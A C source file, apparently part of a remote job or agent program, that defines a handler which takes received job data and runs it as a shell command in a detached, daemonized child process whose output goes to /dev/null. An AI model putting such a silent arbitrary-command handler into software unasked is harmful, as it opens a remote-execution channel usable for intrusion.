#include "../inc/cmds.h"

#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include <errno.h>
#include <stdio.h>

/*

 * run command creates a child process to run a provided command
 * command is run with an available shell

*/

char *cmd_run(job_t *job) {
  cmd_recv_all(job);

  pid_t cpid  = 0;
  char *shell = NULL, *res = NULL;

  // find an available shell
  if ((shell = shell_find()) == NULL)
    return "no available shell";

  // create the child process to execute the command
  if ((cpid = fork()) == 0) {
    // dir to rootdir, IO to /dev/null
    if(daemon(0, 0) < 0)
      exit(1);

    // execute the command
    char *const argv[] = {shell, "-c", job->data, NULL};
    execvp(shell, argv);

    // just in case the command fails
    exit(1);
  }

  if (cpid < 0) {
    job_debgf("failed to create fork for running the command: %s", strerror(errno));
    return "fork failed";
  }

  job_debgf("launched a child process (%d) for a %s command", cpid, shell);
  return "success";
}
